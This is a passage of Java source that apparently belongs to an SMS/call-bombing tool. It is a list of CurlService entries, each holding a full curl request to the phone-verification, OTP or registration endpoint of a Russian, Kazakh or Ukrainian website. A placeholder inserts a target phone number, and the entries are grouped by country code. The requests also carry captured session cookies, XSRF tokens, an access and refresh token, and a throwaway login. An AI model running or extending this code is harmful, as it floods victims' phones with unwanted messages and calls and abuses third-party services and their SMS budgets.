tmr_lvid=ee93256cc0c36e192266043ebc121d30; tmr_lvidTS=1646758918805; iap.uid=39bd60f74db8457b89a874de6400d6f6; _ym_uid=1646758919570684827; _ym_d=1684850970; flocktory-uuid=b26cdebe-f2d7-4c43-af3a-4c5618dad53f-0; __zzatgib-w-vprok=MDA0dBA=Fz2+aQ==; __zzatgib-w-vprok=MDA0dBA=Fz2+aQ==; _ym_isad=2; _ym_visorc=b; adrdel=1; adrcid=As77jfPb8KSehOZ8KNcg1KA; cfidsgib-w-vprok=2lZIBlgCLwFDF7PSp6H5nRpRewPaDgJe/KagGyx7gEw5U2CglS2ovAO1ci3MWRRYVDh3n7H7Zdu9TjAMF3SNxV2uLO0TDqEDxLxISqm7ippMEORIy58zBUpNWrvnF5dhozan0xzLE8JFu/g1CUrpQUOFCFtGDwtxk/Wq; cfidsgib-w-vprok=2lZIBlgCLwFDF7PSp6H5nRpRewPaDgJe/KagGyx7gEw5U2CglS2ovAO1ci3MWRRYVDh3n7H7Zdu9TjAMF3SNxV2uLO0TDqEDxLxISqm7ippMEORIy58zBUpNWrvnF5dhozan0xzLE8JFu/g1CUrpQUOFCFtGDwtxk/Wq; cfidsgib-w-vprok=2lZIBlgCLwFDF7PSp6H5nRpRewPaDgJe/KagGyx7gEw5U2CglS2ovAO1ci3MWRRYVDh3n7H7Zdu9TjAMF3SNxV2uLO0TDqEDxLxISqm7ippMEORIy58zBUpNWrvnF5dhozan0xzLE8JFu/g1CUrpQUOFCFtGDwtxk/Wq; gsscgib-w-vprok=1JTWZz4S08yjnM6ss1fxPPpTbQBXcxFTVa/kz7bRM4vUzvon23jO5suVg+6H4nidmN6Tq3xR+HAmie2V+1s+n8STmcrNyJG8YxnWFnROoJVyVjs2hg6yYyn1c2v/vh6rmkLSktWlz4vakhx2+HNhgocTtNbSbED9nIfsor4kIZvbFNAyb61Oepx3CUpXXashNC9YcGisxo0TtDeFrHeOh+NiB4I7q8VDR5PS6t1wT8ciSMG4GlB3F/HOPDtXeKdGcDSFUOja; gsscgib-w-vprok=1JTWZz4S08yjnM6ss1fxPPpTbQBXcxFTVa/kz7bRM4vUzvon23jO5suVg+6H4nidmN6Tq3xR+HAmie2V+1s+n8STmcrNyJG8YxnWFnROoJVyVjs2hg6yYyn1c2v/vh6rmkLSktWlz4vakhx2+HNhgocTtNbSbED9nIfsor4kIZvbFNAyb61Oepx3CUpXXashNC9YcGisxo0TtDeFrHeOh+NiB4I7q8VDR5PS6t1wT8ciSMG4GlB3F/HOPDtXeKdGcDSFUOja; tmr_detect=0%7C1684850972561; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _ga_B122VKXXJE=GS1.1.1684850969.1.0.1684850974.55.0.0; _POBP_s=rum=1&id=f232bf29-da62-4e9a-9d08-fd98d64774b8&created=1684850968146&expire=1684851883773; fgsscgib-w-vprok=AODHd22f65933cf699867cec8462eac3b99579e4; fgsscgib-w-vprok=AODHd22f65933cf699867cec8462eac3b99579e4' \\\n" +
                        "  -H 'origin: https://www.vprok.ru' \\\n" +
                        "  -H 'referer: https://www.vprok.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-gib-fgsscgib-w-vprok: AODHd22f65933cf699867cec8462eac3b99579e4' \\\n" +
                        "  -H 'x-gib-gsscgib-w-vprok: 1JTWZz4S08yjnM6ss1fxPPpTbQBXcxFTVa/kz7bRM4vUzvon23jO5suVg+6H4nidmN6Tq3xR+HAmie2V+1s+n8STmcrNyJG8YxnWFnROoJVyVjs2hg6yYyn1c2v/vh6rmkLSktWlz4vakhx2+HNhgocTtNbSbED9nIfsor4kIZvbFNAyb61Oepx3CUpXXashNC9YcGisxo0TtDeFrHeOh+NiB4I7q8VDR5PS6t1wT8ciSMG4GlB3F/HOPDtXeKdGcDSFUOja' \\\n" +
                        "  -H 'x-xsrf-token: eyJpdiI6Im9GenBrU0t1akt1YmZvXC9mb0p2OU13PT0iLCJ2YWx1ZSI6IjF0M0NVUWJrTGNQekx6ZXdDeUorUElCY1AxaDFsSHlzOGg0Zk12cHJiOGVaWTRrTlgzakIrcXdKaldadTViRFBBVGorOXdXNnY5TThXQXEwWExVUnd3PT0iLCJtYWMiOiIzZWE3NmU5MTg3Y2U1N2FlY2JkMjlhMjM5NTJlOWFiNmI4NmZlMTQ3Y2U1NjIxNzMzOTNkZGRlZjkzY2U1N2YxIn0=' \\\n" +
                        "  --data-raw 'phone={full_phone}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://aptekiplus.ru/api/v1/user/profile' \\\n" +
                        "  -H 'authority: aptekiplus.ru' \\\n" +
                        "  -H 'accept: application/json' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'cookie: qrator_jsr=1684851248.308.K5dUmC9GBag3JcvN-jd4mr44u0coci67cm6710j64ko0785a8-00; qrator_jsid=1684851248.308.K5dUmC9GBag3JcvN-k0tq91lroc8ji2m2qeas9qveruvndnfs; qrator_ssid=1684851248.797.umO8kS3eEFDzSzrd-cv13358lvr0a8ktutfglrh9pa3rnnvbf; user-city=%7B%22id%22%3A0%2C%22code%22%3A%22moskva%22%2C%22phone%22%3A%228%20(495)%20137-94-95%22%2C%22externalId%22%3A%227700000000000000000000000%22%2C%22regionExternalId%22%3A77%2C%22name%22%3A%22%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0%20%D0%B3%22%7D; _ym_uid=1684851253297738041; _ym_d=1684851253; _ym_isad=2; _ym_visorc=b; buyer=%7B%22id%22%3A%220667db13-8a7b-4df3-9a6a-56e644dbc301%22%7D; favourite-retail-points-notification=%7B%22seen%22%3Atrue%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; accept_cookies=true' \\\n" +
                        "  -H 'mindbox-device-uuid: bb0643e8-bc08-4838-bf34-5b23a4221287' \\\n" +
                        "  -H 'origin: https://aptekiplus.ru' \\\n" +
                        "  -H 'referer: https://aptekiplus.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  --data-raw '{\"phone\":\"{full_phone}\",\"email\":\"bayeyip588@runfons.com\",\"password\":\"qwertyuiopAQE4\",\"regionExternalId\":77,\"cityExternalId\":\"7700000000000000000000000\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://avosend.com/api/registration.action' \\\n" +
                        "  -H 'authority: avosend.com' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded;charset=UTF-8' \\\n" +
                        "  -H 'cookie: SESSION=MmQwNmU4NjQtODg3OS00YzZhLThjYWItZWFlMDJiYjljYTIz; mindboxDeviceUUID=bb0643e8-bc08-4838-bf34-5b23a4221287; directCrm-session=%7B%22deviceGuid%22%3A%22bb0643e8-bc08-4838-bf34-5b23a4221287%22%7D; _gid=GA1.2.581790084.1684851591; _ym_uid=1684851592263111876; _ym_d=1684851592; _ym_isad=2; _ym_visorc=w; _ga=GA1.1.760778997.1684851591; _ga_5X6PVWPZ44=GS1.1.1684851593.1.0.1684851602.0.0.0; amp_84ec34=w4b4u-w0cN_iQqlzInxbpN.NzkwNDU5NTAxMDU=..1h14fm1ce.1h14fot8f.7.1.8' \\\n" +
                        "  -H 'origin: https://avosend.com' \\\n" +
                        "  -H 'referer: https://avosend.com/registration' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  --data-raw 'toValues%5Bphone%5D={full_phone}&hmac=fe7bdeb80577650c53d78d16511aa739&toValues%5Bpost_code%5D=312323&toValues%5Bbirthday%5D=23.12.2001&toValues%5Baddress%5D=%D0%BC%D0%B5%D1%82%D1%80%D0%BE+%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0-%D0%A2%D0%BE%D0%B2%D0%B0%D1%80%D0%BD%D0%B0%D1%8F&toValues%5Bcity%5D=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0&toValues%5Bname%5D=gwerg&toValues%5Bname_f%5D=rewgerg&toValues%5Bemail%5D=bayeyip588%40runfons.com' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://program33.ru/ajax/' \\\n" +
                        "  -H 'authority: program33.ru' \\\n" +
                        "  -H 'accept: text/html, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: PHPSESSID=69eb5e61836acda1a4f7f9df48ef391d; _ym_uid=1684852122599462036; _ym_d=1684852122; _ym_isad=2; _ym_visorc=w' \\\n" +
                        "  -H 'origin: https://program33.ru' \\\n" +
                        "  -H 'referer: https://program33.ru/auth/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'action=phone_registration&phone=%2B{phone:7+(***)+***-**-**}&agreements=1' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://api.privsosed.ru/anketa/api/send-sms/' \\\n" +
                        "  -H 'authority: api.privsosed.ru' \\\n" +
                        "  -H 'accept: */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'cookie: _ym_uid=1684851846790774899; _ym_d=1684851846; _ym_isad=2; _ym_visorc=w; session_id=92bd23da-3dce-4008-aad4-991e44ccd304' \\\n" +
                        "  -H 'origin: https://privsosed.ru' \\\n" +
                        "  -H 'referer: https://privsosed.ru/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  --data-raw '{\"phone\":\"{phone:+7 (***) ***-**-**}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://polyana1c.ru:25101/CRM/hs/pd/auth/send-code' \\\n" +
                        "  -H 'authority: polyana1c.ru:25101' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'bearer: sqsqvr' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'origin: https://polyana.delivery' \\\n" +
                        "  -H 'referer: https://polyana.delivery/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: cross-site' \\\n" +
                        "  --data-raw '{\"phoneNumber\":\"+{full_phone}\"}' \\\n" +
                        "  --compressed", 7),

                new CurlService("curl 'https://login.bilimland.kz/api/v1/registration' \\\n" +
                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Content-Type: application/json;charset=UTF-8' \\\n" +
                        "  -H 'Cookie: _ga=GA1.1.1036095865.1686467148; bilimlandloginservice_session=0CSfVh3iCXLvoaskmViQoBsf0KsYmuyOYJf0ITTH; _ga_0GXFMK8SLT=GS1.1.1686467148.1.0.1686467149.0.0.0; _ym_uid=1686467150699294129; _ym_d=1686467150; guu=; _ym_isad=2; _ym_visorc=b; _zero_cc=6fe9f972072148; _ga_ELKR2LCK3P=GS1.1.1686467149.1.1.1686467156.0.0.0; _zero_ss=6485724e79dfb.1686467151.1686467157.2' \\\n" +
                        "  -H 'Origin: https://login.bilimland.kz' \\\n" +
                        "  -H 'Referer: https://login.bilimland.kz/register' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'X-Requested-With: XMLHttpRequest' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --data-raw '{\"phone\":\"{phone:+7 (7**) ***-**-**}\"}' \\\n" +
                        "  --compressed", 77),

                new CurlService("curl 'https://kumo.com.ua/ru/registration/sms/' \\\n" +
                        "  -H 'authority: kumo.com.ua' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: _gid=GA1.3.94987512.1686468523; _ga_Y2NNEB8P3T=GS1.1.1686468523.1.1.1686468688.58.0.0; _ga=GA1.3.2045236862.1686468523; _gat_gtag_UA_188625914_1=1; XSRF-TOKEN=eyJpdiI6IkRWK0ZDNHMrREhmOW9NR2RCbzVFNGc9PSIsInZhbHVlIjoiV0FmTDFCaGliU3pjQjV4MEYzdHhPSlBZWTIrN01rcDVMVEdGdmxtU0pja3BuWktsOHpEcGpGQzE3SWxNb1dKZSIsIm1hYyI6IjU0YjY1ZDEwM2E2MzQ1MWIxYWJhNjM5MjdmMzM0ZDI1MWNkMzcxOGMwZTExYmMyY2U3OGVlZmI2YWU2OWZiYTkifQ%3D%3D; bank=eyJpdiI6IjlzNkpIdTQraVczQ0NDb0IxK1dhSWc9PSIsInZhbHVlIjoiZ3lPaE5LZXB5dFVMXC9pZzZxNXlkVTlKSDViY0ZueU9NN3k5YklXUmtqd1NWSTYrMjFoVWJDa2dnUHNSUENDV0QiLCJtYWMiOiJmY2NmYWMzMGIzNzQ3ZmNmYzEyMGY3Y2I3NTQ5MzhkNWIyNDdhYjZmYTljNDdhZWFhYmE2Mjc1NTVlY2Y2ODUyIn0%3D' \\\n" +
                        "  -H 'origin: https://kumo.com.ua' \\\n" +
                        "  -H 'referer: https://kumo.com.ua/ru/registration/init' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'phone=%2B{phone:380+**+***+**+**}&_token=qwhYeyrHjxIblkNUXRlaGK4hUeJHVEPNK3xz4HWD&g-recaptcha-response=1' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://api.creditkasa.ua/public/auth/sendAcceptanceCode?productGroup=PDL&phone={full_phone}&brandName=CreditKasa' \\\n" +
                        "  -H 'authority: api.creditkasa.ua' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'origin: https://creditkasa.com.ua' \\\n" +
                        "  -H 'referer: https://creditkasa.com.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: cross-site' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://lovilave.com.ua/v2/sign/request' \\\n" +
                        "  -H 'authority: lovilave.com.ua' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: uk' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'cookie: _gcl_au=1.1.1902977449.1686469253; _ga_Y1SVLVNS5R=GS1.1.1686469252.1.0.1686469252.0.0.0; _ga=GA1.3.975911309.1686469253; _gid=GA1.3.620545716.1686469253; _gat_UA-172658742-1=1; _fbp=fb.2.1686469253544.1320113708; AWSALB=7eI/rLFiex3SkFp1N69Lu05c4c5GJ6Sgy45uu3cTVWvT8+SGK4dOE3IblmV2m4sL8M9TOJ894lBIF9gAm1qjR+fM3ZkoXDLdqgeNaR/kFQrCYCLj6M+J+S8l79u0WLjmEfoPy6+qGTP0rCCESVut3QRw3pBy5TeAFZiSE6nq9OhFM53LoCBFIGD5zNmF0g==; AWSALBCORS=7eI/rLFiex3SkFp1N69Lu05c4c5GJ6Sgy45uu3cTVWvT8+SGK4dOE3IblmV2m4sL8M9TOJ894lBIF9gAm1qjR+fM3ZkoXDLdqgeNaR/kFQrCYCLj6M+J+S8l79u0WLjmEfoPy6+qGTP0rCCESVut3QRw3pBy5TeAFZiSE6nq9OhFM53LoCBFIGD5zNmF0g==' \\\n" +
                        "  -H 'origin: https://lovilave.com.ua' \\\n" +
                        "  -H 'referer: https://lovilave.com.ua/signin' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  --data-raw '{\"Request\":{\"phone\":\"{full_phone}\"}}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://api.tengo.ua/api/v1/user-register?language=uk' \\\n" +
                        "  -H 'authority: api.tengo.ua' \\\n" +
                        "  -H 'accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/json' \\\n" +
                        "  -H 'device-identificator: 68b4f05d5595b97b76c7c28f8246f830_787882041.1686469655' \\\n" +
                        "  -H 'network-connection-effective-type: 4g' \\\n" +
                        "  -H 'origin: https://tengo.ua' \\\n" +
                        "  -H 'referer: https://tengo.ua/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-site' \\\n" +
                        "  --data-raw '{\"lastname\":\"\",\"name\":\"\",\"patronymic\":\"\",\"pesel\":\"\",\"mobile\":\"+{full_phone}\",\"consents\":[{\"label\":\"Надаю ТОВ \\\"Мілоан\\\" свою <a href=\\\"https://content.miloan.ua/uploads/elFinder/zgoda_pers_data-14092018.pdf\\\" target=\\\"_blank\\\">згоду на отримання, збереження та обробку моїх персональних даних</a>.\",\"value\":\"f5db295c-1802-4a35-a803-5cbff4038e89\",\"required\":true,\"checked\":true},{\"label\":\"Не заперечую щодо отримання інформаційних повідомлень про новини, пропозиції кредитних продуктів та послуг від ТОВ \\\"Мілоан\\\".\",\"value\":\"442868e1-32e3-47e6-8bc0-1f8a685bc262\",\"required\":false,\"checked\":false}],\"marketing\":{\"channel\":\"site\",\"externalId\":16864696541892,\"instrument\":\"direct\",\"subchannel\":\"tengo\"},\"detectedData\":{\"deviceId\":\"68b4f05d5595b97b76c7c28f8246f830_787882041.1686469655\",\"deviceTypeId\":\"desktop\",\"deviceModel\":\"windows\",\"hashComponents\":\"key=userAgent;value=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36;key=language;value=ru;key=screenResolution;value=864,1536;key=timezone;value=Europe/Moscow;\",\"screenResolution\":\"864,1536\",\"browser\":\"chrome 108.0.0.0\",\"webLanguage\":\"RU\",\"webCountry\":\"Europe/Moscow\"},\"curSum\":10000,\"curTerm\":15,\"promocode\":\"\"}' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://shop.kyivstar.ua/api/v2/otp_login/send/{phone:0*********}' \\\n" +
                        "  -H 'Accept: application/json, text/plain, */*' \\\n" +
                        "  -H 'Accept-Language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'Connection: keep-alive' \\\n" +
                        "  -H 'Cookie: _gcl_au=1.1.284443421.1686471093; _ga=GA1.2.1844012872.1686471093; _gid=GA1.2.1710388172.1686471094; _gat_UA-30371516-1=1; _gat_UA-68448222-1=1; _clck=h3oupt|2|fcd|0|1257; _fbp=fb.1.1686471094722.441822642; _dc_gtm_UA-68448222-1=1; hl=ua; kyivstar=cb6ee2d1f26b606eb72ca9771e57e972; _hjSessionUser_713006=eyJpZCI6IjkwOGIxYWQ2LTgwYjAtNTBjOC1iNmU2LTNmNmQyZmZmN2MyZSIsImNyZWF0ZWQiOjE2ODY0NzEwOTQ5NjYsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_713006=0; _hjSession_713006=eyJpZCI6IjIxMzI3ZGYzLTJmYTEtNGYzYi04YWM2LTA0NDU4Y2JkODVhMCIsImNyZWF0ZWQiOjE2ODY0NzEwOTQ5NzcsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; user_phone_cookie=non_authenticated; _clsk=t58u8z|1686471126501|2|1|m.clarity.ms/collect; _ga_L4DKTSE2Y3=GS1.1.1686471093.1.1.1686471126.27.0.0' \\\n" +
                        "  -H 'Referer: https://shop.kyivstar.ua/smartphones?loginRedirect=%2Fprofile%2Forders' \\\n" +
                        "  -H 'Sec-Fetch-Dest: empty' \\\n" +
                        "  -H 'Sec-Fetch-Mode: cors' \\\n" +
                        "  -H 'Sec-Fetch-Site: same-origin' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  --compressed", 380),

                new CurlService("curl 'https://elmir.ua/response/load_json.php?type=validate_phone' \\\n" +
                        "  -H 'authority: elmir.ua' \\\n" +
                        "  -H 'accept: application/json, text/javascript, */*; q=0.01' \\\n" +
                        "  -H 'accept-language: ru,en;q=0.9,en-GB;q=0.8,en-US;q=0.7' \\\n" +
                        "  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \\\n" +
                        "  -H 'cookie: visit=https%3A%2F%2Felmir.ua%2Fcell_phones%2F; chat_id=guest%3A1686471415.9541%3A1800068454; h=..s8gS1Be%60-%25SItfwxdS; h=..s8gS1Be%60-%25SItfwxdS; elm38=169034859; ua=0; PHPSESSID=h201a3nbf3suhgbf5d42ves7j9; sess=71fSWEytF671fSWEytF6; sess3=71fSWEytF671fSWEytF6; _ga=GA1.2.1614924221.1686471410; _gid=GA1.2.767035712.1686471411; _fbp=fb.1.1686471411192.1498870346; slow=181.4; device-source=https://elmir.ua/cell_phones/; device-referrer=; helpcrunch.com-elmir-2-user-id=guest:1686471415.9541:1800068454; helpcrunch.com-elmir-2-helpcrunch-device={\"id\":2551856,\"secret\":\"zJzeg4zIOK3Zr4tqpo56ltdMjdKvtBNbFd3d0oV1ifR9T+KOME81EX5/BtPVCHuCIyhAvj2JUQ+aE+sGlBSfMQ==\",\"sessions\":1}; helpcrunch.com-elmir-2-device-id=2551856; helpcrunch.com-elmir-2-token-data={\"access_token\":\"3ok8GHc3HcLWiY9SD8Qw7gwgg1kDnIiPKAZmzTT8XX3ZF8Ubsc26rrQFWhIvYWDQqJJvqfT+zUDy1EWbFjqyiGyXfyLS4lCDsYmlgmQyryCk/1YYbVXgvgvvTW2AJlQ04xN0dJY10U0tHcvkXF4HoxDCQ5nx2cTClGJX2lVvPiRsNn/aKod1X70cYayX5ovZJS8erCZ22ger39YyNjlUwXzta3wBX2mjMN6aseIKMSwIwtIxL7ssnAeteR9WfyGXkpYaqgCUUI7Z459wZ1AHf117LP82qpVHpTlK5ldCpH3eRiHabniKWH2l4s5nkSGBUnvP3yFC8QWqK1xPPdDqpuWS8+7u5SnC4TrUhEajhUkcQOGbESpohIyN9BuetefJ33NOKLmGPS0JC8KkiEclRubEo5DTTG804JkdBbNzd9CX7dizXBKCxCl1umAAhOoJR5D6mE4NBeId7PMQY28v45msxID+WaQFVXXDX1grD438OzdIphaxDAwRu+qOZbq8H4rJkbQOhB+w4qToLYJSzdz8LnAxGOglZuOcJGkly59teydhjoYCc6JHh0O+xydUWjJc5+BhUEMIDNIf3nTWjHOp63qZIsRcYceFMMCw4XY99e58UDnlEeDuT0klapk1hnBrwrqWuLQul/vqvy2PuQc5qD9J/IFnRnBqwSJzVotb7k7DZPjQSAyxvn/2MqxNDyohBzea4lI9stHj2j1gacq/STSLGqT4eANP14bYcXJtxMkkC86Eon7eXgYxwtIh4W5WwI4ycNwXJXg4VhNtdWe5n6Fwg+zVJhEcu72wdnyRk/pEtnGWI+eKrPdvQfZy\",\"refresh_token\":\"NSrTYUuA7TeztRwgFREjb2zjxuMm0JPA+pJ9yzWyykWAOg45qMzLzeDxPUfbjpJ1BdDzV/KmbkHB7F3TJCsK\",\"expires_in\":1686473099458}; _ga_79B3PN4ZWG=GS1.1.1686471410.1.1.1686471459.11.0.0' \\\n" +
                        "  -H 'origin: https://elmir.ua' \\\n" +
                        "  -H 'referer: https://elmir.ua/cell_phones/' \\\n" +
                        "  -H 'sec-ch-ua: \"Google Chrome\";v=\"108\", \"Chromium\";v=\"108\", \"Not=A?Brand\";v=\"24\"' \\\n" +
                        "  -H 'sec-ch-ua-mobile: ?0' \\\n" +
                        "  -H 'sec-ch-ua-platform: \"Windows\"' \\\n" +
                        "  -H 'sec-fetch-dest: empty' \\\n" +
                        "  -H 'sec-fetch-mode: cors' \\\n" +
                        "  -H 'sec-fetch-site: same-origin' \\\n" +
                        "  -H 'x-requested-with: XMLHttpRequest' \\\n" +
                        "  --data-raw 'fields%5Bphone%5D=%2B{full_phone}&fields%5Bcall_from%5D=register&fields%5Bsms_code%5D=&action=call' \\\n" +
                        "  --compressed", 380),

